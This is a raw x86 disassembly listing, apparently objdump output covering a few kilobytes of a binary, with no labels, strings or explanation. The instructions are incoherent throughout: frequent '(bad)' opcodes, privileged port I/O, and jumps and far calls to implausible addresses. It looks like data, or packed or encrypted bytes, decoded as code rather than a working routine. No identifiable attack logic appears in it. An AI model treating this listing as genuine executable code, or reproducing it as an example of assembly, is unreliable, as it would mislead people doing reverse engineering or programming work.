  41b3a3:	in     eax,dx
  41b3a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3a5:	push   edx
  41b3a6:	mov    BYTE PTR [eax+ecx*4],al
  41b3a9:	outs   dx,BYTE PTR ds:[esi]
  41b3aa:	imul   esp,eax,0x9b879b75
  41b3b0:	in     eax,dx
  41b3b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3b2:	jecxz  0x41b3c4
  41b3b4:	pop    es
  41b3b5:	test   al,0x3
  41b3b7:	mov    edx,0x6b517df2
  41b3bc:	sub    al,bh
  41b3be:	jp     0x41b42d
  41b3c0:	mov    DWORD PTR [esi+eax*8+0x29ce4efb],edi
  41b3c7:	push   ecx
  41b3c8:	add    dl,BYTE PTR [edx-0x1f]
  41b3cb:	or     BYTE PTR [esp+eax*1+0x76],0x2
  41b3d0:	(bad)  
  41b3d1:	dec    esp
  41b3d2:	fisubr DWORD PTR [esi+0x5db233e8]
  41b3d8:	lock scas eax,DWORD PTR es:[edi]
  41b3da:	stc    
  41b3db:	and    al,0xfa
  41b3dd:	(bad)  
  41b3de:	out    0xf4,eax
  41b3e0:	dec    edi
  41b3e1:	dec    esi
  41b3e2:	and    bh,dl
  41b3e4:	dec    edx
  41b3e5:	push   edi
  41b3e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3e7:	out    0xec,eax
  41b3e9:	adc    dh,BYTE PTR [edi-0x3f]
  41b3ec:	sub    al,0x31
  41b3ee:	sar    DWORD PTR [ebp-0x3b],1
  41b3f1:	fisubr DWORD PTR [eax+ebx*2-0x3097b6e3]
  41b3f8:	imul   ebp,DWORD PTR [edi-0x48a40bd2],0x6a
  41b3ff:	inc    DWORD PTR [esp+ebx*1]
  41b402:	pop    ebp
  41b403:	popa   
  41b404:	inc    esp
  41b405:	dec    ecx
  41b406:	out    dx,eax
  41b407:	sub    DWORD PTR [ecx-0x6c],0x43
  41b40b:	pushf  
  41b40c:	lahf   
  41b40d:	sar    DWORD PTR [eax],cl
  41b40f:	cmc    
  41b410:	mov    cl,0xed
  41b412:	mul    esp
  41b414:	push   edx
  41b415:	push   ebp
  41b416:	stos   DWORD PTR es:[edi],eax
  41b417:	jnp    0x41b3d0
  41b419:	and    BYTE PTR [ebp-0x1d21a0],al
  41b41f:	mov    BYTE PTR [ebx-0x7036aa08],al
  41b425:	(bad)  
  41b426:	push   cs
  41b427:	inc    ebx
  41b428:	jae    0x41b443
  41b42a:	into   
  41b42b:	push   ebp
  41b42c:	mov    ah,0xd0
  41b42e:	inc    esi
  41b42f:	test   dl,0x6
  41b432:	push   es
  41b433:	cmp    al,0xdd
  41b435:	(bad)  
  41b436:	mov    dl,0xff
  41b438:	push   eax
  41b439:	mov    al,0xd
  41b43b:	dec    edx
  41b43c:	ds shl ebx,0x93
  41b440:	ror    DWORD PTR [edx+0x4d],1
  41b443:	loop   0x41b410
  41b445:	cmp    ecx,ebp
  41b447:	leave  
  41b448:	mov    bl,0x7
  41b44a:	adc    al,0xf2
  41b44c:	clc    
  41b44d:	cmp    al,al
  41b44f:	or     eax,eax
  41b451:	js     0x41b3dc
  41b453:	sub    DWORD PTR [edi-0xd],ebp
  41b456:	addr16 xor BYTE PTR [bp+si-0x2e5c],ah
  41b45c:	push   ecx
  41b45d:	add    eax,0xfb26ec94
  41b462:	add    bl,BYTE PTR [edx+0x1d]
  41b465:	das    
  41b466:	push   ebx
  41b467:	je     0x41b4e7
  41b469:	push   esi
  41b46a:	add    ch,BYTE PTR [eax-0x52]
  41b46d:	rol    BYTE PTR [edi],cl
  41b46f:	mov    bh,0x85
  41b471:	pop    ebx
  41b472:	mov    edx,DWORD PTR cs:[ebp-0x70e6a367]
  41b479:	sbb    ah,BYTE PTR [esi]
  41b47b:	retf   
  41b47c:	mov    esi,DWORD PTR [eax]
  41b47e:	stc    
  41b47f:	mov    ds:0xa6fb53de,al
  41b484:	add    ah,ah
  41b486:	jp     0x41b4aa
  41b488:	inc    ecx
  41b489:	adc    DWORD PTR [edi],edx
  41b48b:	inc    eax
  41b48c:	ret    
  41b48d:	daa    
  41b48e:	fst    DWORD PTR [esi]
  41b490:	pop    ebx
  41b491:	xor    esi,DWORD PTR [eax+0x5c09194a]
  41b497:	test   BYTE PTR [edx-0x5e],cl
  41b49a:	mov    ds:0xca95a614,al
  41b49f:	dec    eax
  41b4a0:	sti    
  41b4a1:	mov    edx,0xe408bc70
  41b4a6:	nop
  41b4a7:	xchg   esp,eax
  41b4a8:	jmp    0xadb51f5d
  41b4ad:	xchg   edx,eax
  41b4ae:	sub    BYTE PTR [eax],al
  41b4b0:	push   0x46
  41b4b2:	xor    al,0xd7
  41b4b4:	out    dx,eax
  41b4b5:	test   al,0x2f
  41b4b7:	cmp    eax,DWORD PTR [edx-0xc2bb4c4]
  41b4bd:	outs   dx,BYTE PTR ds:[esi]
  41b4be:	cmp    ebx,DWORD PTR [edx]
  41b4c0:	push   ds
  41b4c1:	mov    ds:0xbe0e0105,al
  41b4c6:	neg    DWORD PTR [edi+edx*4+0x7ae68d97]
  41b4cd:	(bad)  
  41b4ce:	cmc    
  41b4cf:	in     al,dx
  41b4d0:	mov    eax,0x4816b85a
  41b4d5:	popf   
  41b4d6:	xor    BYTE PTR [ebp-0x476fccfa],ah
  41b4dc:	imul   edi,DWORD PTR [ecx+edi*1-0x42a4e637],0xffffffa4
  41b4e4:	pop    es
  41b4e5:	ficomp DWORD PTR ds:0xcd9c7c75
  41b4eb:	inc    ebp
  41b4ec:	mov    ebp,0xdd614e3b
  41b4f1:	fxch   st(5)
  41b4f3:	stc    
  41b4f4:	push   ebp
  41b4f5:	sub    DWORD PTR [edx-0x2f],edx
  41b4f8:	fist   WORD PTR [edi]
  41b4fa:	add    ch,al
  41b4fc:	cmp    cl,BYTE PTR [edi+0x15]
  41b4ff:	inc    ebp
  41b500:	add    ah,ch
  41b502:	cmp    edx,DWORD PTR [eax+0x6b]
  41b505:	cwde   
  41b506:	repnz icebp 
  41b508:	test   eax,0xa549cb1
  41b50d:	sub    BYTE PTR [ecx+esi*1],0x8f
  41b511:	cmc    
  41b512:	jnp    0x41b4f7
  41b514:	cmp    BYTE PTR [edi+0x1c5de87],al
  41b51a:	sub    ebx,edx
  41b51c:	or     ah,BYTE PTR [ebp-0x13]
  41b51f:	ss addr16 leave 
  41b522:	or     BYTE PTR [edx],0xab
  41b525:	(bad)  [edi-0x4e]
  41b528:	lock (bad) 
  41b52a:	mov    esi,0x46506eb7
  41b52f:	xchg   esi,eax
  41b530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b531:	sub    eax,0x2d80ca89
  41b536:	dec    ebp
  41b537:	pop    edi
  41b538:	mov    edi,0xcce9ef2a
  41b53d:	in     al,dx
  41b53e:	lods   eax,DWORD PTR ds:[esi]
  41b53f:	push   0xcce4cbd5
  41b544:	fnstenv [ebx+0x3a6addff]
  41b54a:	(bad)  [edi-0x22]
  41b54d:	imul   edx,DWORD PTR [esi+ebp*4-0x69],0xffffffc4
  41b552:	sub    al,0x46
  41b554:	mov    ah,0x3d
  41b556:	test   eax,0x25214c3
  41b55b:	ficom  WORD PTR [edx+ebx*1]
  41b55e:	cwde   
  41b55f:	je     0x41b5b7
  41b561:	fwait
  41b562:	jb     0x41b5b0
  41b564:	fnsave [eax]
  41b566:	fstp   DWORD PTR [ebx]
  41b568:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b569:	mov    DWORD PTR [edx-0x7d],edi
  41b56c:	inc    ebp
  41b56d:	ss dec ecx
  41b56f:	test   eax,0xc953f389
  41b574:	adc    dh,BYTE PTR [edx]
  41b576:	add    dl,BYTE PTR ds:0x75718546
  41b57c:	pop    ecx
  41b57d:	mov    al,0xbe
  41b57f:	xor    ah,al
  41b581:	inc    edx
  41b582:	pop    es
  41b583:	and    al,0xd7
  41b585:	cwde   
  41b586:	sbb    ah,BYTE PTR [edx]
  41b588:	in     al,dx
  41b589:	stc    
  41b58a:	push   ds
  41b58b:	dec    ebx
  41b58c:	nop
  41b58d:	enter  0x8787,0x6e
  41b591:	scas   al,BYTE PTR es:[edi]
  41b592:	add    al,BYTE PTR [edx+0x50040415]
  41b598:	cmp    al,0xe9
  41b59a:	push   edx
  41b59b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b59c:	push   es
  41b59d:	xchg   edx,eax
  41b59e:	inc    BYTE PTR [edi-0x46]
  41b5a1:	es in  eax,dx
  41b5a3:	lods   al,BYTE PTR ds:[esi]
  41b5a4:	ror    DWORD PTR [eax-0xf],0x28
  41b5a8:	xor    al,0xe6
  41b5aa:	fs mov ebx,0x636bee5c
  41b5b0:	dec    eax
  41b5b1:	add    BYTE PTR [eax+ebx*1+0x60a6bb61],bl
  41b5b8:	fadd   DWORD PTR [ebp-0x57]
  41b5bb:	jmp    FWORD PTR [edi+0x1f]
  41b5be:	mov    ds:0x78d13533,eax
  41b5c3:	outs   dx,DWORD PTR ds:[esi]
  41b5c4:	aam    0x89
  41b5c6:	retf   0xcb42
  41b5c9:	popf   
  41b5ca:	aaa    
  41b5cb:	jns    0x41b5ad
  41b5cd:	push   cs
  41b5ce:	(bad)  
  41b5cf:	ffreep st(2)
  41b5d1:	mov    edx,0xdac1b2f0
  41b5d6:	jns    0x41b5b5
  41b5d8:	(bad)  
  41b5d9:	fcos   
  41b5db:	mov    ch,0x41
  41b5dd:	test   BYTE PTR ds:0x83b3cc8c,dl
  41b5e3:	lea    ebx,[ebx-0x39]
  41b5e6:	jb     0x41b585
  41b5e8:	push   ebp
  41b5e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5ea:	cmp    bh,BYTE PTR [ebx-0x78]
  41b5ed:	cmp    BYTE PTR [eax-0x72620f03],ah
  41b5f3:	lods   al,BYTE PTR ds:[esi]
  41b5f4:	xchg   edx,eax
  41b5f5:	loope  0x41b5bb
  41b5f7:	das    
  41b5f8:	adc    edi,ebp
  41b5fa:	lods   al,BYTE PTR ds:[esi]
  41b5fb:	sbb    bl,BYTE PTR [esp+eiz*2-0x10dd7676]
  41b602:	mov    ds:0x949fff6a,al
  41b607:	call   0x83f856bf
  41b60c:	test   eax,0x61d3707
  41b611:	adc    al,0x1e
  41b613:	sar    al,1
  41b615:	sbb    BYTE PTR [edx-0xe],cl
  41b618:	or     DWORD PTR [edx-0x5c],eax
  41b61b:	dec    edi
  41b61c:	les    edi,FWORD PTR [eax+0x21]
  41b61f:	add    BYTE PTR [eax+eiz*8-0x1e],ch
  41b623:	mov    esp,0x10c314eb
  41b628:	ficomp DWORD PTR [ebx+0x38]
  41b62b:	mov    dl,0xc6
  41b62d:	push   0x1937aa61
  41b632:	les    ebx,FWORD PTR [edx-0x11]
  41b635:	scas   eax,DWORD PTR es:[edi]
  41b636:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b637:	mov    edx,0x4557654d
  41b63c:	push   edx
  41b63d:	addr16 ret 
  41b63f:	ret    
  41b640:	mov    ds:0xeab98573,al
  41b645:	pop    esp
  41b646:	shl    ch,0x6d
  41b649:	jge    0x41b5f1
  41b64b:	pusha  
  41b64c:	leave  
  41b64d:	cmp    bh,BYTE PTR [edi]
  41b64f:	or     cl,al
  41b651:	or     ecx,DWORD PTR [esi]
  41b653:	mov    dh,0xc
  41b655:	sbb    esp,ebx
  41b657:	ror    BYTE PTR [esi+esi*1],cl
  41b65a:	ret    
  41b65b:	mov    cl,cl
  41b65d:	fdivr  QWORD PTR [edi*2-0xdbd4f60]
  41b664:	cmp    DWORD PTR es:[edi+0x3dd967d5],ecx
  41b66b:	mov    ds:0x9ccf0c48,al
  41b670:	inc    ebx
  41b671:	loope  0x41b69b
  41b673:	inc    esp
  41b674:	je     0x41b6bb
  41b676:	into   
  41b677:	retf   
  41b678:	push   ecx
  41b679:	(bad)  
  41b67a:	adc    bl,BYTE PTR [ebx]
  41b67c:	xor    al,0x92
  41b67e:	xchg   edi,eax
  41b67f:	mov    bh,BYTE PTR [ebp-0x37a5edd5]
  41b685:	mov    edx,0xdb120412
  41b68a:	dec    ebx
  41b68b:	aam    0x57
  41b68d:	adc    eax,0x5b33aa41
  41b692:	rcr    eax,1
  41b694:	pushf  
  41b695:	cmp    ecx,edx
  41b697:	mov    ds:0x6479a091,eax
  41b69c:	pop    eax
  41b69d:	add    eax,0x15ec3977
  41b6a2:	xor    ebx,DWORD PTR [edx-0xc0bf127]
  41b6a8:	push   0x3e1dd9f3
  41b6ad:	in     eax,dx
  41b6ae:	jg     0x41b65e
  41b6b0:	call   0xd024:0x9f735430
  41b6b7:	or     eax,0x1bab6f2e
  41b6bc:	jmp    0x3dc6403
  41b6c1:	xchg   ebp,eax
  41b6c2:	sti    
  41b6c3:	cmp    ecx,DWORD PTR [ebx+esi*1]
  41b6c6:	int    0xd9
  41b6c8:	pop    ds
  41b6c9:	pusha  
  41b6ca:	aad    0x6e
  41b6cc:	aaa    
  41b6cd:	add    eax,DWORD PTR [ecx+0x2]
  41b6d0:	xchg   DWORD PTR [ebx+0x61],ebx
  41b6d3:	mov    bl,0xa8
  41b6d5:	adc    BYTE PTR [ebx-0x65],bl
  41b6d8:	mov    ch,0x8d
  41b6da:	xor    edx,eax
  41b6dc:	dec    esi
  41b6dd:	pop    eax
  41b6de:	jge    0x41b68f
  41b6e0:	sbb    BYTE PTR [edi+0x2],bh
  41b6e3:	cmp    ecx,DWORD PTR ds:0x81096af8
  41b6e9:	add    bl,BYTE PTR [ecx]
  41b6eb:	mov    eax,ds:0x8089b733
  41b6f0:	or     esp,DWORD PTR [ecx]
  41b6f2:	cli    
  41b6f3:	loope  0x41b696
  41b6f5:	xor    ebx,DWORD PTR [ecx-0x75]
  41b6f8:	icebp  
  41b6f9:	jbe    0x41b722
  41b6fb:	in     eax,dx
  41b6fc:	jo     0x41b6a3
  41b6fe:	cmp    dl,BYTE PTR [edi]
  41b700:	ret    0xa1e5
  41b703:	cmp    al,0xc7
  41b705:	ss inc esi
  41b707:	popf   
  41b708:	xor    esi,DWORD PTR [edx-0x277d2d5d]
  41b70e:	sbb    al,0x43
  41b710:	xor    dl,BYTE PTR [esi-0x62a8f86c]
  41b716:	enter  0x772c,0x12
  41b71a:	inc    edi
  41b71b:	jl     0x41b774
  41b71d:	jne    0x41b72c
  41b71f:	jge    0x41b783
  41b721:	in     eax,0xb0
  41b723:	jl     0x41b703
  41b725:	cld    
  41b726:	mov    ds:0x2484d6fe,al
  41b72b:	cmp    eax,0xe922de53
  41b730:	inc    esp
  41b731:	inc    edx
  41b732:	add    DWORD PTR [ebp+0x7b],edx
  41b735:	cmp    DWORD PTR [ecx+0x124ad200],esi
  41b73b:	and    ebp,DWORD PTR [eax]
  41b73d:	sub    eax,0xc9e9d18
  41b742:	push   cs
  41b743:	cmc    
  41b744:	daa    
  41b745:	jbe    0x41b720
  41b747:	add    esi,DWORD PTR [esi+0x5b]
  41b74a:	std    
  41b74b:	call   eax
  41b74d:	jle    0x41b74d
  41b74f:	add    BYTE PTR [edx-0x79110305],bl
  41b755:	sub    eax,0x86e8679a
  41b75a:	int3   
  41b75b:	leave  
  41b75c:	mov    edx,0xe900abb9
  41b761:	arpl   WORD PTR [edi],sp
  41b763:	push   es
  41b764:	js     0x41b727
  41b766:	aad    0xcd
  41b768:	pop    edx
  41b769:	adc    cl,BYTE PTR [edx-0x6]
  41b76c:	loope  0x41b75d
  41b76e:	ins    DWORD PTR es:[edi],dx
  41b76f:	add    BYTE PTR [ebx],cl
  41b771:	cmp    DWORD PTR [ebx+0x7c9d695],ebx
  41b777:	scas   eax,DWORD PTR es:[edi]
  41b778:	popf   
  41b779:	sub    BYTE PTR [ecx+eiz*1-0x63],0x35
  41b77e:	repnz fabs 
  41b781:	mov    ecx,?
  41b783:	leave  
  41b784:	cmp    BYTE PTR [ebp-0x6587d71],cl
  41b78a:	shr    DWORD PTR [edx+0x0],0x13
  41b78e:	(bad)  
  41b78f:	rol    dh,1
  41b791:	or     eax,0x67fb8be8
  41b796:	lea    ebp,[edx-0xa]
  41b799:	xchg   esi,eax
  41b79a:	dec    eax
  41b79b:	jne    0x41b742
  41b79d:	jno    0x41b7a5
  41b79f:	sbb    al,0x84
  41b7a1:	cwde   
  41b7a2:	xlat   BYTE PTR ds:[ebx]
  41b7a3:	mov    edi,DWORD PTR [eax+0x402fef29]
  41b7a9:	add    ebx,ecx
  41b7ab:	cmc    
  41b7ac:	cmp    eax,0xcd7112e
  41b7b1:	add    BYTE PTR [edx+0x76],dh
  41b7b4:	and    al,BYTE PTR [edi]
  41b7b6:	and    al,0xd3
  41b7b8:	jne    0x41b7b7
  41b7ba:	dec    edx
  41b7bb:	fisttp WORD PTR ss:[ebx]
  41b7be:	adc    ebx,DWORD PTR [edx+esi*4]
  41b7c1:	cmp    edx,DWORD PTR [ebp+0x2979b546]
  41b7c7:	ins    BYTE PTR es:[edi],dx
  41b7c8:	adc    cl,BYTE PTR [ecx]
  41b7ca:	push   es
  41b7cb:	pop    ebx
  41b7cc:	jg     0x41b781
  41b7ce:	js     0x41b7e3
  41b7d0:	scas   al,BYTE PTR es:[edi]
  41b7d1:	jno    0x41b851
  41b7d3:	xchg   esp,eax
  41b7d4:	and    dh,dl
  41b7d6:	jne    0x41b7b3
  41b7d8:	lods   eax,DWORD PTR ds:[esi]
  41b7d9:	pop    ebx
  41b7db:	pop    ebp
  41b7dc:	push   0x69d99a97
  41b7e1:	dec    ebp
  41b7e2:	mov    ds,esi
  41b7e4:	xor    BYTE PTR [ebp+edi*4-0x25],cl
  41b7e8:	add    DWORD PTR [edx+0x500aa4f6],esp
  41b7ee:	jnp    0x41b849
  41b7f0:	mov    esp,0x34878ff5
  41b7f5:	pop    eax
  41b7f6:	in     al,0x7f
  41b7f8:	sub    DWORD PTR [ebx+0x56],ecx
  41b7fb:	sbb    ecx,DWORD PTR [edx+0x78]
  41b7fe:	mov    dh,0x4c
  41b800:	mov    BYTE PTR [eax+ebx*1+0x649f94c3],dl
  41b807:	jne    0x41b7da
  41b809:	ret    0x641c
  41b80c:	loope  0x41b865
  41b80e:	jns    0x41b7fd
  41b810:	and    BYTE PTR [ebp-0x25],0x78
  41b814:	sub    DWORD PTR [eax+ecx*8],ecx
  41b817:	popa   
  41b818:	sub    esp,eax
  41b81a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b81b:	enter  0x4c2a,0xe4
  41b81f:	or     edi,DWORD PTR [ebx+0x6b6904d3]
  41b825:	(bad)
  41b828:	mov    BYTE PTR [edx-0x76],dh
  41b82b:	ret    
  41b82c:	sub    al,0xcc
  41b82e:	(bad)  
  41b82f:	out    dx,al
  41b830:	pop    edi
  41b831:	push   edx
  41b832:	adc    DWORD PTR [edi-0x25f780b2],esi
  41b838:	fisttp WORD PTR [ebp-0x13200d1d]
  41b83e:	xchg   edi,eax
  41b83f:	outs   dx,DWORD PTR ds:[esi]
  41b840:	daa    
  41b841:	xchg   DWORD PTR [edi+0x7f9ae31f],ecx
  41b847:	xchg   ecx,eax
  41b848:	cmp    BYTE PTR [esi-0x7f],cl
  41b84b:	jns    0x41b8a7
  41b84d:	or     dl,al
  41b84f:	rol    DWORD PTR [ecx+0x5e],0x75
  41b853:	pop    edx
  41b854:	ja     0x41b83e
  41b856:	loopne 0x41b80b
  41b858:	in     al,0x1b
  41b85a:	cdq    
  41b85b:	gs jns 0x41b7fc
  41b85e:	retf   
  41b85f:	and    DWORD PTR [edi+0x6d],ecx
  41b862:	jmp    0x8263:0x38506974
  41b869:	lods   al,BYTE PTR ds:[esi]
  41b86a:	add    eax,0x4fd3e01f
  41b86f:	pop    es
  41b870:	inc    ebp
  41b871:	test   bl,0x2f
  41b874:	adc    al,0x59
  41b876:	xchg   BYTE PTR [esi],dl
  41b878:	scas   eax,DWORD PTR es:[edi]
  41b879:	mov    cl,0x74
  41b87b:	(bad)  
  41b87c:	jno    0x41b8bd
  41b87e:	mov    ebp,0xf523afaa
  41b883:	(bad)  
  41b884:	sub    DWORD PTR [eax+0x5ab2c596],ebx
  41b88a:	jnp    0x41b886
  41b88c:	and    eax,0x9b9ee0ab
  41b891:	jnp    0x41b89b
  41b893:	scas   al,BYTE PTR es:[edi]
  41b894:	ins    BYTE PTR es:[edi],dx
  41b895:	fadd   QWORD PTR [ecx-0xf]
  41b898:	or     edx,DWORD PTR [ebx-0x102d212c]
  41b89e:	mov    al,0xd4
  41b8a0:	add    eax,0xd982ce4b
  41b8a5:	das    
  41b8a6:	pop    edi
  41b8a7:	ret    
  41b8a8:	data16 addr16 jb 0x41b834
  41b8ac:	push   edx
  41b8ad:	sub    DWORD PTR [ebx+0x7d4f5447],edi
  41b8b3:	jno    0x41b8d4
  41b8b5:	mov    esi,0xba9b15be
  41b8ba:	pop    edi
  41b8bb:	dec    edx
  41b8bc:	test   BYTE PTR [edi-0x4c],al
  41b8bf:	push   es
  41b8c0:	inc    edi
  41b8c1:	retf   
  41b8c2:	stc    
  41b8c3:	sbb    dl,BYTE PTR [eax+0x1771d6cd]
  41b8c9:	ins    DWORD PTR es:[edi],dx
  41b8ca:	cli    
  41b8cb:	pop    ecx
  41b8cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8cd:	sbb    DWORD PTR [esi-0x47],ebp
  41b8d0:	fst    st(5)
  41b8d2:	ret    0x94b5
  41b8d5:	xor    al,BYTE PTR [edi]
  41b8d7:	(bad)  
  41b8d8:	shl    BYTE PTR [eax-0x62],0x5f
  41b8dc:	mov    WORD PTR [edi+0xc64a05d],si
  41b8e3:	inc    ebx
  41b8e4:	xor    al,0x9a
  41b8e6:	shl    DWORD PTR [ecx-0x790b76bd],1
  41b8ec:	xchg   BYTE PTR [edx-0x64],cl
  41b8ef:	dec    ebx
  41b8f0:	mov    edx,0xb254d446
  41b8f5:	xchg   ebp,eax
  41b8f6:	ror    DWORD PTR [ebx-0x2a8e32f8],0x84
  41b8fd:	fistp  WORD PTR [esi+edx*4+0x2a]
  41b901:	enter  0x58f1,0x84
  41b905:	add    ebp,DWORD PTR [ebx-0x6f]
  41b908:	xchg   edx,eax
  41b909:	mov    ebp,0x7de665a0
  41b90e:	mov    edx,0x5626c61f
  41b913:	hlt    
  41b914:	xchg   ebx,eax
  41b915:	leave  
  41b916:	aad    0xa7
  41b918:	xor    esi,DWORD PTR [eax+ebp*1]
  41b91b:	in     al,dx
  41b91c:	xchg   ah,bh
  41b91e:	mov    dh,0x22
  41b920:	inc    ebx
  41b921:	cwde   
  41b922:	ret    0x7be3
  41b925:	shl    DWORD PTR [edx+esi*8],1
  41b928:	ds sbb ch,bl
  41b92b:	jg     0x41b8bc
  41b92d:	mov    BYTE PTR [edi+ebx*1],ah
  41b930:	jmp    0x6993f856
  41b935:	ins    BYTE PTR es:[edi],dx
  41b936:	and    DWORD PTR [ebp-0x37d22a5d],ecx
  41b93c:	rol    BYTE PTR [eax-0x46],cl
  41b93f:	sub    esi,DWORD PTR [ebp-0x78]
  41b942:	popf   
  41b943:	arpl   WORD PTR [ecx+0xb],dx
  41b946:	cmp    eax,0xe4eea3b2
  41b94b:	or     esp,ebx
  41b94d:	mov    eax,ds:0xf1d38686
  41b952:	shr    ch,0x4a
  41b955:	xchg   edi,eax
  41b956:	jae    0x41b97b
  41b958:	pop    ds
  41b959:	xchg   edx,eax
  41b95a:	stos   BYTE PTR es:[edi],al
  41b95b:	cli    
  41b95c:	pop    edx
  41b95d:	mov    eax,ds:0xd7de9d58
  41b962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b963:	clc    
  41b964:	fidiv  WORD PTR [edx+0x51]
  41b967:	lock (bad) 
  41b969:	(bad)  
  41b96a:	mov    edi,0xf38d97df
  41b96f:	pop    eax
  41b970:	adc    eax,0x82a308ff
  41b975:	push   cs
  41b976:	loope  0x41b9bc
  41b978:	fs dec esp
  41b97a:	cmp    DWORD PTR [ebx+0x2c],eax
  41b97d:	push   ss
  41b97e:	outs   dx,BYTE PTR ds:[esi]
  41b97f:	cld    
  41b980:	cmp    DWORD PTR [ecx-0x17],eax
  41b983:	fisubr WORD PTR [edx]
  41b985:	ss leave 
  41b987:	pop    ebx
  41b988:	sub    DWORD PTR [esp+ebx*8-0x48],esp
  41b98c:	pop    ebx
  41b98d:	push   ds
  41b98e:	cdq    
  41b98f:	and    BYTE PTR ds:0xd4440ae5,al
  41b995:	out    0xdd,eax
  41b997:	push   eax
  41b998:	lods   al,BYTE PTR ds:[esi]
  41b999:	es test al,0x24
  41b99c:	add    al,0x63
  41b99e:	push   esi
  41b99f:	push   ebp
  41b9a0:	(bad)  
  41b9a1:	js     0x41b97a
  41b9a3:	pusha  
  41b9a4:	mov    bh,0x58
  41b9a6:	pop    ebp
  41b9a7:	scas   eax,DWORD PTR es:[edi]
  41b9a8:	out    dx,al
  41b9a9:	mov    al,0x7e
  41b9ab:	addr16 out 0x42,eax
  41b9ae:	or     ebp,ecx
  41b9b0:	add    dh,cl
  41b9b2:	nop
  41b9b3:	pop    esp
  41b9b4:	push   0x40bbd154
  41b9b9:	jnp    0x41b987
  41b9bb:	retf   
  41b9bc:	pop    eax
  41b9bd:	mov    BYTE PTR [esp+ebp*4-0x9fabbef],al
  41b9c4:	enter  0x6e88,0xd5
  41b9c8:	mov    dl,0x12
  41b9ca:	lds    edx,FWORD PTR [edi-0x7593d144]
  41b9d0:	mov    ebp,0xce37899a
  41b9d5:	add    DWORD PTR [ebx],0xffffff9e
  41b9d8:	mov    al,ds:0xe3405502
  41b9dd:	mov    esi,cs
  41b9df:	sbb    al,0x98
  41b9e1:	xchg   ebx,eax
  41b9e2:	jmp    0x56c2:0x7ea11f5d
  41b9e9:	xchg   ebx,eax
  41b9ea:	add    al,BYTE PTR ds:0x5c5f1e90
  41b9f0:	add    al,0xa
  41b9f2:	in     eax,0x5e
  41b9f4:	cwde   
  41b9f5:	leave  
  41b9f6:	dec    esi
  41b9f7:	push   cs
  41b9f8:	jmp    0xe061a068
  41b9fd:	int3   
  41b9fe:	pop    eax
  41b9ff:	push   gs
  41ba01:	pop    edx
  41ba02:	lds    ecx,FWORD PTR [edi-0x6674af90]
  41ba08:	test   al,0x75
  41ba0a:	cdq    
  41ba0b:	lahf   
  41ba0c:	imul   esi,ecx,0xab651796
  41ba12:	sar    BYTE PTR [eax+0x18],1
  41ba15:	leave  
  41ba16:	mov    bh,bl
  41ba18:	push   esp
  41ba19:	jmp    0x2cd0e732
  41ba1e:	shl    dl,1
  41ba20:	mov    esi,DWORD PTR [ebp-0x1b858e6]
  41ba26:	(bad)  
  41ba28:	jb     0x41ba23
  41ba2a:	jae    0x41ba47
  41ba2c:	leave  
  41ba2d:	(bad)  
  41ba2e:	and    eax,ebp
  41ba30:	xor    BYTE PTR [ecx],0xf4
  41ba33:	mov    eax,ds:0x4bdb4ebe
  41ba38:	(bad)  
  41ba39:	in     al,dx
  41ba3a:	repz push cs
  41ba3c:	dec    edx
  41ba3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba3e:	iret   
  41ba3f:	mov    edi,0x74dc2da
  41ba44:	into   
  41ba45:	xor    eax,0x1ab7fcb5
  41ba4a:	cmp    cl,bh
  41ba4c:	sbb    eax,DWORD PTR [edx-0x1894236f]
  41ba52:	fst    QWORD PTR [ebx]
  41ba54:	jbe    0x41ba9e
  41ba56:	xchg   esp,eax
  41ba57:	xor    bh,ah
  41ba59:	dec    edi
  41ba5a:	out    dx,al
  41ba5b:	cs mov bl,0xc
  41ba5e:	mov    gs:0x88f69a2e,al
  41ba64:	div    BYTE PTR ds:0xd36cc8ee
  41ba6a:	jmp    0x6c84e332
  41ba6f:	sub    esi,DWORD PTR [edi]
  41ba71:	inc    eax
  41ba72:	leave  
  41ba73:	sbb    DWORD PTR [ecx],edx
  41ba75:	sub    eax,0xec90e9c7
  41ba7a:	addr16 daa 
  41ba7c:	and    ebp,DWORD PTR [ecx-0x5]
  41ba7f:	mov    DWORD PTR [eax+0x2d],ecx
  41ba82:	mov    DWORD PTR [eax+ecx*4+0x4e5ee95c],eax
  41ba89:	xchg   esi,eax
  41ba8a:	pop    esi
  41ba8b:	imul   ecx,DWORD PTR [ebx+0x408f080c],0xffffff90
  41ba92:	not    dh
  41ba94:	add    DWORD PTR [ebp+0x3b],eax
  41ba97:	cmc    
  41ba98:	jge    0x41ba59
  41ba9a:	dec    ebp
  41ba9b:	push   esp
  41ba9c:	pop    esi
  41ba9d:	sbb    DWORD PTR [eax],0xcb421132
  41baa3:	arpl   WORD PTR [eax+ebp*8-0xfbc0d1f],si
  41baaa:	retf   
  41baab:	cmp    BYTE PTR [edi-0x488e10e5],0x34
  41bab2:	ret    
  41bab3:	jb     0x41baf6
  41bab5:	xchg   ecx,eax
  41bab6:	stc    
  41bab7:	push   0x34aaee54
  41babc:	mov    al,0xdc
  41babe:	jnp    0x41ba44
  41bac0:	leave  
  41bac1:	dec    ebx
  41bac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bac3:	mov    dl,0x22
  41bac5:	xchg   ebp,eax
  41bac6:	out    0xec,eax
  41bac8:	sub    eax,0x3dd2ceba
  41bacd:	out    dx,al
  41bace:	push   esi
  41bacf:	xchg   DWORD PTR [ecx],esi
  41bad1:	cmp    ah,BYTE PTR [ebx-0x6b]
  41bad4:	pop    ds
  41bad5:	and    cl,BYTE PTR [ecx]
  41bad7:	push   eax
  41bad8:	ja     0x41bb3f
  41bada:	xchg   esp,eax
  41badb:	fcomi  st,st(4)
  41badd:	(bad)  
  41badf:	xor    ebp,esi
  41bae1:	dec    esp
  41bae2:	clc    
  41bae3:	cdq    
  41bae4:	or     dl,dh
